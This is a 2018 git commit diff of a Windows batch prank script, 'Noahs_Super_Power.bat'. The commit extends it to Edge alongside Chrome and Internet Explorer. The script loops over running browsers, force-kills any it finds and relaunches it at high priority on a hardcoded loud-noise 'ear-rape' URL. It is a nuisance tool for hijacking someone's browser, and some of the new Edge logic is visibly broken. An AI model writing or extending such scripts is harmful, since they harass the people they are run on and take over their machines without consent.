5283b692bef3d04ac0342b98b6cb184ebaa644a4
Grathium <33742269+Grathium@users.noreply.github.com>
2018-06-15 19:25:33 +1000

    Update Noahs_Super_Power.bat

--- Noahs_Super_Power.bat
+++ Noahs_Super_Power.bat
@@ -2,19 +2,20 @@
 ::NOAH'S SUPER POWER V1.0::
 :::::::::::::::::::::::::::
 :: Copyright (c) Grathium Softwares 2018, grathiumsoftwears@gmail.com
-:: *to change webbrowser homepage change the "set /a homepage=" INSERT WEBSTIE HERE "
+
+REM *to change webbrowser homepage change the 'url after chrome.exe/iexplore.exe/MicrosoftEdge.exe "ENTER NEW HOMEPAGE URL HERE"'
+REM *compatiable with chrome, edge and internet explorer
 
 @echo off
 color e
 title Noahs Super Power
-set /a homepage="http://ear-rape-website.com"
-set /a startupsound="http://link-to-startup-website.com"
 set /a okay=0
 ver >nul
 cls
 
+goto loop
 :A
-start "Super Sound" /MIN %startupsound%
+start chrome.exe ""
 timeout /nobreak 10
 cls
 
@@ -22,24 +23,34 @@ cls
 :loop
 if /i "%okay%" EQU "1" goto waitchrome
 if /i "%okay%" EQU "2" goto waitie
+if /i "%okay%" EQU "3" goto waitedge
 tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
 if "%ERRORLEVEL%"=="0" goto yeschrome
 tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL
 if "%ERRORLEVEL%"=="0" goto yesie
+tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
+if "%ERRORLEVEL%"=="0" goto yesedge
 goto loop
 
 :yeschrome
 taskkill /F /IM chrome.exe
-start "Google Chrome" /HIGH chrome.exe "%homepage%"
+start "Google Chrome" /HIGH chrome.exe "http://ear-rape-website.com"
 cls
 set /a okay=1
 timeout /nobreak 4 >nul
 goto loop
 :yesie
 taskkill /F /IM iexplore.exe /T
-start "IExplore" /HIGH iexplore.exe "%homepage%"
+start "IExplore" /HIGH iexplore.exe "http://ear-rape-website.com"
 cls
 set /a okay=2
+timeout /nobreak 4 >nul
+goto loop
+:yesedge
+taskkill /F /IM MicrosoftEdge.exe /T
+start "IExplore" /HIGH MicrosoftEdge.exe "http://ear-rape-website.com"
+cls
+set /a okay=3
 timeout /nobreak 4 >nul
 goto loop
 
@@ -47,11 +58,19 @@ goto loop
 tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
 if not "%ERRORLEVEL%"=="0" goto waitchrome
 timeout /t 0 >nul
+set /a okay=0
 goto loop
 :waitie
 tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "iexplore.exe">NUL
 if not "%ERRORLEVEL%"=="0" goto waitie
 timeout /t 0 >nul
+set /a okay=0
+goto loop
+:waitedge
+tasklist /FI "IMAGENAME eq MicrosoftEdge.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
+if not "%ERRORLEVEL%"=="0" goto waitie
+timeout /t 0 >nul
+set /a okay=0
 goto loop
 
 ::security stuff
